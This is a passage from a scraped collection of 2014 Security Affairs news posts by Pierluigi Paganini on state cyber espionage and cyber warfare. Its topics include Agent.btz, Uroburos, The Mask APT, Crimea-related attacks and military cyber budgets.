publicly known \u2013 at least by the time of Red October and Gauss/Flame creation. First of all, it wasn\u2019t a secret that Agent.btz used \u2018thumb.dd\u2019 as a container file to collect information about infected systems. \u201d \u201cSecondly, the XOR key used by developers of Turla and Agent.btz to encrypt their log files was also published in 2008. It\u2019s unknown since when this key was first used in Turla, but we see it for sure in the latest samples of the malware (created in 2013-2014). At the same time, there is some data that Turla\u2019s development started in 2006 \u2013 before any known sample of Agent.btz. Which leaves the question open.\u201d has written Gostev.\n\nAccording researchers at Kaspersky Lab, who uncovered the Red October, it\u2019s possible the malicious code used for the campaign was designed to scan for the \u201cthumb.dd\u201d file on the victim in order to steal the data contained in the file.\n\nGostev remarked that there also are some similarities between the Flame, Gauss and the Agent. btz, but this circumstance could be a consequence of the fact that the authors of Flame and Gauss have had access to the analysis of Agent.btz.\n\n\u201cSummarizing all the above, it is possible to regard Agent.btz as a certain starting point in the chain of creation of several different cyber-espionage projects. The well-publicized story of how US military networks were infected could have served as the model for new espionage programs having similar objectives, while its technologies were clearly studied in great detail by all interested parties.

The tension rose just after the 2014 Ukrainian revolution, in which the government of President Viktor Yanukovych was ousted after a popular revolt in Kiev. In the region there are groups contrary to the protest that desire the integration of Crimea with Russia, and these groups are opposed to others consisting of Crimean Tatars and ethnic Ukrainians which supported the revolution. The deposed president Yanukovych during the days of revolution covertly requested the intervention of the Russian military to stabilize the internal situation of Ukraine.\n\n\n\nThe Ukrainian government accused Russia of interference in Ukraine\u2019s internal affairs and invasion of the country, but Moscow denied these accusations. The Russian militia involved in the Peninsula of Crimea was also reinforced with other resources, including a couple of vessels of the Russian Black Sea Fleet, which violated Ukrainian waters.\n\nAfter the events precipitated on March 1, the Russian parliament approved President Vladimir Putin\u2019s order to use military force in Ukraine.\n\nThe tension between Russia and Crimea has a corresponding conflict in cyber space. Numerous attacks were registering on both sides during the revolution in Kiev, and the cyber offensives have had an escalating after the approval of the Russian parliament for military use in the Crimea. The decision of the Russian government has triggered a series of events in cyber space as state-sponsored cyber units, groups of hacktivists, and cyber criminals started their campaigns against the enemies.\n\nUkraine\u2019s mobile phone infrastructure is under attack, according to the declaration of Valentyn Nalivaichenk, the head of Ukraine\u2019s SBU security service during a press conference. The official stated that the country is suffering a serious attack in the last few days. The attack against Ukraine\u2019s mobile phone infrastructure originated in Crimea and is interfering with the phones of members of the parliament.\n\n\u201cI confirm that an IP-telephonic attack is under way on the mobile phones of members of Ukrainian parliament for the second day in a row,\u201d declared Valentyn Nalivaichenko, according the Reuters agency.\n\nUkraine\u2019s telecommunications system has come under attack. The attackers used equipment installed within Ukrtelecom networks in the Crimea region under the control of Russian forces. This circumstance has raised tension between the two countries, and although the majority of the Crimean population is pro-Russian, the sabotage is interpreted by the government of Kiev as an intolerable act of war. The equipment is blocking the phones of Nalivaichenko and his deputies.\n\n\u201cAt the entrance to (telecoms firm) Ukrtelecom in Crimea, illegally and in violation of all commercial contracts, was installed equipment that blocks my phone as well as the phones of other deputies, regardless of their political affiliation \u2026 The security services are now seeking to restore at least the security of communications,\u201d according to the security chief. \u201cAll state information security systems were unprepared for such a brazen violation of the law,\u201d Nalivaichenko said.\n\nThe attack is not isolated. Internet connections within the peninsula of Crimea have been severely hampered. Not yet identified militias have seized the offices of telecommunications service provider Ukrtelecom, cutting phone and Internet cables. Militias also set up roadblocks to isolate Crimea from the rest of the Ukraine. Both military operations appear as part of a strategy to isolate the region in case of attack.\n\nSecurity experts believe that the mission for the Russian military is to isolate the region, and probably for this reason Russian naval vessels were placed in the port at Sevastopol: the units are carrying jamming equipment to block radio communications. Ukrainian naval communications stations around the area of Sevastopol and power lines have been already sabotaged. The Crimean peninsula is suffering numerous denial of service attacks , and Ukrainian telecom provider Ukrtelecom JSC reported that \u201cunknown individuals seized several Crimean communications facilities\u201d last week and that communications between the peninsula and the rest of Ukraine have been degraded as a result of \u201cunknown actions [that] physically damaged fiber optic trunk cable[s].\u201d Other disconcerting news reports that all communication services in Crime have been shut off, including Internet and mobile.\n\nThe attacks have taken place also on the Web, as numerous website were already attacked. Two government websites in Crimea were shut down, but it is not clear if they were brought down by foreign hackers or by the same officials of local government.\n\nOther media sources report that the Crimean Peninsula\u2019s landline, Internet, and mobile services have been almost entirely shut off. Military experts have no doubt that this is the prelude to a kinetic operation. In particular, Russia adopted the same strategy in 2008 when it isolated Georgia by taking control of government websites and interfering with Internet activities in the country that was without its own Internet exchange point (IXP) and was reliant on foreign governments, including Russia, for nearly 70% of its Internet exchange capacity.\n\nThe Ukraine seems to have just one Internet exchange point located in Crimea, so it\u2019s quite easy for Russian cyber units to isolate the region.\n\n\u201cUkraine has a strong and diverse Internet frontier \u2026 The roads and railways of Ukraine are densely threaded with tens of thousands of miles of fiberoptic cable, connecting their neighbors to the south and east (including Russia) with European Internet markets. The country has a well-developed set of at least eight regional Internet exchanges, as well as direct connections over diverse physical paths to the major Western European exchanges. At this level of maturity, our model predicts that the chances of a successful single-event Internet shutdown are extremely low,\u201d revealed a recent analysis by intelligence company Renesys, which monitors Internet service around the world.\n\nTwo Crimean government web portals also went offline, but the cause is still unclear. The attacks also hit Russian entities. The most famous victim is the Russian news agency, Russia Today. Its website was defaced by unknown hackers.\n\nIn an information warfare context, the principal targets are critical infrastructure of a country. We must consider that the Russian government dedicates huge investments to improve cyber capabilities and it is possible that in case of an imminent kinetic attack, the government of Moscow will use also cyber weapons to destabilize defensive structures in the area.\n\nIf you are interested to see how Russian entities are operating in the cyber space and which is the role of groups of hacktivists in the cyber dispute between Russia and Ukraine read the complete post on the Infosec Institute\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Crime , cyber warfare)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/crimea", "topic_name": "Crimea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/denial-of-service", "topic_name": "Denial of Service"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/georgia", "topic_name": "Georgia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivists", "topic_name": "hacktivists"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia-today", "topic_name": "Russia Today"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russian-business-network", "topic_name": "Russian Business Network"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ukraine", "topic_name": "Ukraine"}]}, {"news_name": "$5 Billion in Military Cyber Spending fivefold increase over last year", "news_link": "https://securityaffairs.co/wordpress/22952/cyber-warfare-2/5-billion-military-cyber-spending.html", "title": "$5 Billion in Military Cyber Spending fivefold increase over last year\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 11, 2014", "body": "$5 Billion in Military Cyber Spending, this is the budget reserved by the Pentagon for cyber operations next year, an impressive amount of money that demonstrates the high priority assigned by the US government for the improvement of cyber capabilities. The new Defense Department budget, part of the comprehensive $496 billion fiscal 2015 budget, reveals numerous cost reductions in programs and activities, except for some DoD cybersecurity initiatives.\n\nThe first consideration that must be done is that the total Military Cyber Spending fivefold increase over last year, an increase of $4 million on which there is still little clarity.\n\n\u201cThere\u2019s no set of program elements that led to this number. Maybe there needs to be, but right now there isn\u2019t,\u201d is the opinion of the outgoing comptroller Bob Hale, rolling out the Obama administration\u2019s fiscal 2015 spending request at the Pentagon.\n\nGiving a look to the \u201cThe President\u2019s Budget for Fiscal Year 2015\u201d is possible to observe that within the goals to strengthen national security there is the necessity to improve and provide capabilities to protect the United States and its interests around the world. In particular the US Government plans to improve cyber capabilities to respond to cyber threats that more frequently are targeting US infrastructures, private companies and Government entities.\n\n\u201cEnsures we maintain ready, modern, and capable defense forces to address any threats we might face, including threats from terrorism and cyber attacks. \u201c\n\nIf the allocation of such an investment does not seem to be a problem, many questions are raised about how this money should be spent in a national security cyber strategy.\n\nA fund spending within the $5.1 billion Military Cyber Spending will be reserved for cyber operations to go toward the continued development of 133 special cyber mission teams. \n\nA critical goal, of course, is the improvement on defense for critical infrastructure against internet-based attacks, The Pentagon has estimated that the number of cyber mission team staffers in place by 2016 will reach 6,000 units, including 13 national mission teams with eight national support teams.\n\n\u201cSome of the infrastructure protection roles that DOD is eyeing are really where the private firms who own and operate [power supplies] should be stepping up instead,\u201d Singer said.\n\n\u201cThe question isn\u2019t the funding side, but figuring out the proper roles and responsibilities, especially in how the line is better set between DOD, the rest of government and private responsibilities,\u201d \u201cWe haven\u2019t yet gotten to point where we are able to figure out how spending translates into capability. That is \u2014 if I double my cyber spending, does it give me a 10 percent, 100% or 1,000% increase in capability? Cyber is a realm where it doesn\u2019t translate like that well,\u201d said Peter Singer, director of the Center for 21st Century Security and Intelligence at the Brookings Institution.\n\nIt is interesting to highlight the great effort requested for the creation of the Joint Information Environment, an investment of $13.3 million to build a single, secure cloud-based information sharing platform for the military.\n\nFollowing the key requests for cyber expenditures:\n\nAs reported in the budget overview, other cyber highlights include:\n\nI desire to close the post with data related to the defense budgets of the principal countries in 2013, the US military spending is impressive.\n\n\n\nChina\u2019s recently announced 802.2 billion yuan ($131.57 billion) defense budget with a 12.2% boost from the year before, despite there are no data related to the military cyber spending, the experts believe that the effort of the Chinese Government is similar to the American one.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  military cyber spending, cyber warfare)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/2015-budget", "topic_name": "2015 budget"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-capabilities", "topic_name": "cyber capabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-spending", "topic_name": "Cyber spending"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dod", "topic_name": "DoD"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/the-presidents-budget-for-fiscal-year-2015", "topic_name": "The President's Budget for Fiscal Year 2015"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us-infrastructures", "topic_name": "US infrastructures"}]}, {"news_name": "Crimea \u2013 Is Russia adopting the same cyber strategy used in Georgia?", "news_link": "https://securityaffairs.co/wordpress/22781/cyber-warfare-2/crimea-russia-cyber-strategy.html", "title": "Crimea \u2013 Is Russia adopting the same cyber strategy used in Georgia?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 5, 2014", "body": "The approval of Russian Parliament for military use in Crimea has triggered a series of events in the cyber space, groups of hacktivists, cyber criminals and of course state-sponsored hackers started their campaign against the enemies.

The rootkit is able to take control of an infected machine, execute arbitrary commands and hide system activities. It can steal information (most notably: files) and it is also able to capture network traffic. Its modular structure allows extending it with new features easily, which makes it not only highly sophisticated but also highly flexible and dangerous. Uroburos\u2019 driver part is extremely complex and is designed to be very discrete and very difficult to identify.\u201d reported G Data analysis.\n\nThe Uroborus rootkit presents an unusual complexity, it is a modular malicious agent certainly designed in Russia based on the references left by authors in its source code.  \n\n\n\nThe peculiarity of the malware is that it checks for the presence of the USB stick-loving Agent.btz (\u2018Buckshot Yankee\u2019) on the victims\u2019 computer, a worm that successfully infected US military networks in 2008. If Uroburos finds Agent.btz worm, it does not activate.\n\n\u201cThe malicious software, or malware, caught a ride on an everyday thumb drive that allowed it to enter the secret system and begin looking for documents to steal. Then it spread by copying itself onto other thumb drives. Pentagon officials consider the incident, discovered in October 2008, to be the most serious breach of the U.S. military\u2019s classified computer systems.\u201d \n\n\u201cThe efforts to neutralize the malware, through an operation code-named Buckshot Yankee, also demonstrated the importance of computer espionage in devising effective responses to cyber\u00adthreats.\u201d reported the Washington Post.\n\nAccording experts at G Data Uroburos is considerable a framework resulted from Intelligence activity, for sure it has requested a huge investment and it is likely that malware developers involved in the project are still working on it.\n\n\u201cBy commanding one infected machine that has Internet connection, the malware is able to infect further machines within the network, even the ones without Internet connection. It can spy on each and every infected machine and manages to send the exfiltrated information back to the attackers, by relaying this exfiltrated data through infected machines to one machine with Internet connection.\u201d\n\nThe Uroburos rootkit was designed to infect networks of huge organizations even if they have air gapped sub-networks.\n\nCompare the Uroburos to Stuxnet it excessive in my opinion, anyway, it represents an important example of the effort spent by a government and according experts it is part of Russian government cyber-weapons programme.  \n\n\u201cwe assume that the group behind Uroburos is the same group that performed a cyberattack against the United States of America in 2008 with a malware called Agent.BTZ.\u201d reported G Data. \n\nAt the time I was writing, it is unknown how Uroburos infiltrates targeted networks, most conceivable infection vectors are spear phishing, drive-by-infections, USB sticks, or social engineering attacks.\n\nI suggest the reading of the detailed analysis issued by G-Data.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  cyber weapons, Urobutos)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rootkit", "topic_name": "rootkit"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada", "topic_name": "SCADA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/uroburos", "topic_name": "Uroburos"}]}, {"news_name": "Government-built malware and cyber weapons will run out of control", "news_link": "https://securityaffairs.co/wordpress/22677/malware/government-built-malware-cyber-weapons-will-run-control.html", "title": "Government-built malware and cyber weapons will run out of control\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 2, 2014", "body": "F-Secure\u2019s Chief Research Officer Company Mikko Hypp\u00f6nen at the TrustyCon conference in San Francisco explained that almost every government is spending a great effort to improve its cyber capabilities building a cyber weapon.\n\n\u201cGovernments writing viruses: today we sort of take that for granted but 10 years ago that would have been science fiction,\u201d \u201cIf someone had come to me ten years ago and told me that by 2014 it will be commonplace for democratic Western governments to write viruses and actively deploy them against other governments, even friendly governments, I would have thought it was a movie plot. But that\u2019s exactly where we are today.\u201d he told during his speech. \n\nCountries like US and Israel are probably most advanced in the development of cyber weapons, Stuxnet was the first malware designed with the specific intent to hit critical infrastructure of a hostile Government like Iran.\n\n\n\nConsider also China that is probably the most aggressive state, according to the US intelligence the Government of Beijing has its malware already used in different state-sponsored attacks. \n\nAlso European governments are very active in the development of state-sponsored malware, German police and customs officials have used in the past a malicious code dubbed R2D2.

Other countries very active are the Sweden, that has developed its malicious code, and Russia that is investing to improve its cyber arsenal.\n\nIn time I\u2019m writing the security community is evaluating the possibility that advanced Uroburos rootkit that has been infecting networks since as far back as 2011, is a modular spyware of the Russian government cyber weapons programme.\n\nHypp\u00f6nen was involved in the investigation on Stuxnet, and he discovered that was possible to make a reverse engineering of the detected samples to build new agents and hit new types of targets.\n\nIn the case of Stuxnet it was hard to modify the code related to the attack against industrial SCADA control systems, but anyway, the malware could be adapted to send malicious commands to an infected industrial plant that could cause serious damages.\n\nThese agents are very effective and adopt complex techniques to deceive victim\u2019s systems, the Flame malware, for example, used a false Windows Update system to spread itself, but malware authors were able to sign malicious code to allow target infection without raising suspects. \n\nRecently security experts at Kaspersky lab identified a new malware family used in a large-scale cyber espionage campaign dubbed the Mask, probably the most sophisticated APT operation seen to date that hit entities in 31 different countries. The agents behind The Mask are Spanish-speaking and exploited at least a zero-day in their campaign, distributing the Mask malware on every OS including Mac OS X, Linux, and perhaps even iOS and Android.\n\nMany experts argue that the anti-virus companies, in some cases, have not prevented the spread of malware because they agreed with the governments.\n\nThe Dutch campaign group called Bits of Freedom invited principal antivirus vendors to reveal any request to whitelist some kinds of malware being designed by the government, Hypponen claimed that Symantec and McAfee have not yet responded.\n\n\u201cThe question was answered by our CEO saying \u2018No, we haven\u2019t\u2019, we have never whitelisted any government malware since the source doesn\u2019t come into play \u2013 we simply protect all our customers,\u201d \u201cWe\u2019ve had this policy for 13 years.\u201d said Mikko Hypp\u00f6nen.\n\nIf antivirus companies are whitelisting state malware there will be the concrete risk that Government-built malware and cyber weapons will run out of control.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Cyber weapon, malware)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rootkit", "topic_name": "rootkit"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada", "topic_name": "SCADA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}]}, {"news_name": "South Korea is developing a cyber weapon to hit North Korean nuclear", "news_link": "https://securityaffairs.co/wordpress/22514/cyber-warfare-2/south-korea-cyber-weapon.html", "title": "South Korea is developing a cyber weapon to hit North Korean nuclear\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 23, 2014", "body": "The tension between North Korea and South Korea is always high, both governments are spending a great effort to improve their cyber capabilities and to try to silently attack the neighbors.\n\nNorth Korea has the highest percentage of military personnel in relation to population, it has approximately 40 enlisted soldiers per 1000 people with a considerable impact on the budge of the country.

The experts believe that the new cyber espionage campaign lasts for more than 5 years and it is the most sophisticated APT operation they\u2019ve seen to date. \n\nThe Mask campaign is characterized by the use of unique components used by attackers to syphon sensitive information on victims\u2019 machines, including encryption and SSH keys, and to wipe and delete any other data on the victim. The attackers behind The Mask are Spanish-speaking and targeted more than 30 countries around the world, the hackers also exploited at least a zero-day in their campaign, and of course they were able to distribute the Mask malware on every OS including Mac OS X, Linux, and perhaps even iOS and Android.\n\n\u201cThese guys are better than the Flame APT group because of the way that they managed their infrastructure,\u201d\u201cThe speed and professionalism is beyond that of Flame or anything else that we\u2019ve seen so far.\u201d said Costin Raiu, head of global research and analysis at Kaspersky during the Kaspersky Security Analyst Summit.  \n\nThe investigation on The Mask started after the Kaspersky team saw the group of hackers exploiting a vulnerability in one of the company\u2019s products to compromised machines using an old version of its application. \n\n\n\nThe Mask Group had a number of different tools at their disposal, including implants that enabled them to maintain persistence on victims\u2019 machines, intercept all TCP and UDP communications in real-time and remain invisible on the compromised machine. The initial stage of the attack occurs with spear-phishing emails that would lead victims to a compromised Web site used to serve one of the available exploits.\n\nInteresting to note that one of the exploit was based on the Adobe Flash vulnerability CVE-2012-0773 whose exploitation allows an attacker to bypass the sandbox in the Chrome browser. The Adobe Flash exploited was discovered by researchers at VUPEN, a French firm specialized in the sale of exploits and zero-day information. \n\nThe choice of this king of flaw, that was never leaked publicly, is motivated by the need of attackers to include in the Mask campaign different OSs, including OS X and Linux machines, as well as some mobile platforms.\n\n\u201cKaspersky researchers found Windows and OS X samples and some indications of a Linux versions, but don\u2019t have a Linux sample. There also is some evidence that there may be versions for both iOS and Android.\u201d\n\nKaspersky researchers have successfully sinkholed about 90 of the C&C domains the attackers were using, Raiu confirmed all of the communications between victims and the C&C servers were encrypted.\n\n\n\n\nThe operation was shut down last week within a few hours, the Mask operators once discovered have rolled up the campaign within about four hours, but security experts are quite sure that attackers could resurrect the APT campaign soon. \n\n\u201cThey could come back very quickly if they wanted,\u201d Raiu said.\n\nThe details on the operation are available on an interesting document published on SecureList\n\nPierluigi Paganini\n\n(Security Affairs \u2013  The Mask APT campaign, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/backdoor", "topic_name": "backdoor"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/icefog", "topic_name": "Icefog"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ics", "topic_name": "ICS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/javafog", "topic_name": "Javafog"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/kasperky", "topic_name": "Kasperky"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nettraveler", "topic_name": "NetTraveler"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/raiu", "topic_name": "Raiu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada", "topic_name": "SCADA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hacking", "topic_name": "state-sponsored hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/the-mask", "topic_name": "the Mask"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/vupen", "topic_name": "VUPEN"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zero-day", "topic_name": "zero-Day"}]}, {"news_name": "Cost of conducting APT campaigns is dramatically dropping", "news_link": "https://securityaffairs.co/wordpress/22056/cyber-crime/apt-cost-dramatically-dropping.html", "title": "Cost of conducting APT campaigns is dramatically dropping\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 9, 2014", "body": "The cost of developing advanced malware has fallen dramatically malicious code like Stuxnet and Flame are today economically more affordable. It has been estimated that the expense for the development of a cyber weapon like Stuxnet,or for a sophisticated spyware like Duqu, is collapsed from $100 million to just $10,000.\n\nSpeaking at Kaspersky Lab\u2019s Industry Analyst Summit Costin Raiu, head of global research and analysis at Kaspersky, revealed that cost for Stuxnet design was nearly $100 million.\n\n \n\n \n\nThe dropping for the cost represents an element of serious concerns for cyber security experts because it is lowering the barrier to entry to the global cyber-arms race.\n\n\u201cThe cost of entry for APT is decreasing,\u201d \u201cWe\u2019re going to see more surgical strikes and critical infrastructure attacks.\u201dsaid Costin Raiu\n\nBehind those malware even more sophisticated there are groups of hackers, also identified with terms like APT or advanced persistent threats, which work for governments or are part of their cyber unit.\n\nAPT are typically involved in cyber attacks on high-value targets, including government organization, financial institutions, critical infrastructure and defense contractors.\n\nIn the past the financial effort necessary to sustain APT was impressive, I remember an interesting analysis proposed by the popular hacker Charlie Miller on the cost for the design of a cyber weapon, he estimated an involvement of 592 people and an investment of $45.9 mil in annual salary with an average annual salary $77,534.\n\nThe cost is totally different from the $10,000 hypothesized for  the realization of the IceFog malware which was discovered last year and that hit US energy companies with a Java Backdoor.\n\nAccording to experts at Kaspersky the Javafog backdoor could indicate that the Icefog mercenaries were running a US-specific operation, according the analysis on the backdoor used the team was preparing a long-term cyber espionage campaign.\n\n\u201cThe focus on the US targets associated with the only known Javafog C&C could indicate a US-specific operation run by the Icefog attackers; one that was planned to take longer than usual, such as, for instance, long-term collection of intelligence on the target,\u201d \u201cThis brings another dimension to the Icefog gang\u2019s operations, which appear to be more diverse than initially thought.\u201d reported the Kaspersky report.\n\nWhile Icefog campaign probably required an investment of no more than $10,000, the NetTraveler APT campaign likely cost about $500,000, that is nothing compared to the 100$ dollars for Stuxnet.\n\n\u201cIf you\u2019re thinking that\u2019s a lot of money, it\u2019s not,\u201d \u201cIt\u2019s the cost of several missiles.\u201d\n\n\u201cIcefog is special because it indicates a new trend of cyber mercenaries, maybe five to ten people that are highly skilled,\u201d \u201cThey knew what documents they wanted to steal from each machine and they spent only a few minutes on each machine.\u201dRaiu said. \n\n\n\nRaiu has no doubts lowering of the costs associated to APT campaigns will cause a significant increase in the number of dangerous cyber attacks \u2026 let\u2019s wait for further revelation on the last APT offensive dubbed \u201cThe Mask\u201c.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  APT, state-sponsored hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/backdoor", "topic_name": "backdoor"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/charlie-miller", "topic_name": "Charlie Miller"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/icefog", "topic_name": "Icefog"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ics", "topic_name": "ICS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/javafog", "topic_name": "Javafog"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/kasperky", "topic_name": "Kasperky"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nettraveler", "topic_name": "NetTraveler"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/raiu", "topic_name": "Raiu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada", "topic_name": "SCADA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/smart-cities", "topic_name": "smart cities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hacking", "topic_name": "state-sponsored hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/the-mask", "topic_name": "the Mask"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}]}, {"news_name": "Admiral Rogers chosen as new NSA director.The man of Information Warfare", "news_link": "https://securityaffairs.co/wordpress/21857/intelligence/rogers-new-nsa-chief.html", "title": "Admiral Rogers chosen as new NSA director.The man of Information Warfare\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 2, 2014", "body": "The Obama Administration will assign the command of NSA to Michael S.

Reuters agency reported that hackers penetrated into an Israeli defense ministry computer using a malicious email as a vector, according first via revelation on the attack it has been used an email with a malicious attachment that looked like it had been sent by the country\u2019s Shin Bet secret security service.\n\nAviv Raff, chief technology officer at Seculert, confirmed that the attackers have penetrated into the network of Israeli Defense accessing to 15 computers, one of them managed by the Israel\u2019s Civil Administration that monitors Palestinians in Israeli-occupied territory. Be aware the Civil Administration is a unit of Israel\u2019s defense ministry that control the passage of goods between Israel and the West Bank and Gaza Strip, it is clear that the information contained in the infected system represents a precious target for someone who intend to examine what and who is authorized to pass through the territories contested by Israelis and Palestinians.\n\nThe office also manages entry permits to Palestinians who work in Israel, and this could be another motivation for the attack. The earliest evidence would seem to confirm that the attack was conducted by Palestinians hackers because there are many similarities with a precedent attack against Israeli systems conduced more than a year ago from a server in the Hamas-ruled Gaza Strip.\n\nIn time I\u2019m writing Israeli Defense officials haven\u2019t commented the discovery:\n\n\u201cWe are not commenting on it, we don\u2019t respond to such reports,\u201d said one of the officials, Guy Inbar, a spokesman for the Civil Administration.\n\nLet me add that this is not a sufficient proof, we all know how much complicated is the attribution for an attack in 